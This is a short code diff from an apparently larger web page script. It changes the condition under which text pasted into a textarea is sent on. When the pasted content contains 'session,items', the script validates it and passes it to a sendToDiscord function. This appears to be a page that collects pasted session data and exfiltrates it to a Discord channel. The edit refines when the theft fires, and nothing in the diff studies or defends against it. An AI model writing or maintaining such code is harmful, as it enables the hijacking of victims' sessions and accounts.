@@ -270,7 +270,7 @@
             
             // Check if paste worked
             setTimeout(function() {
-                if (textarea.value.toLowerCase().includes('session')) {
+                if (textarea.value.toLowerCase().includes('session,items')) {
                     validateText();
                     sendToDiscord(textarea.value);
                 } else {
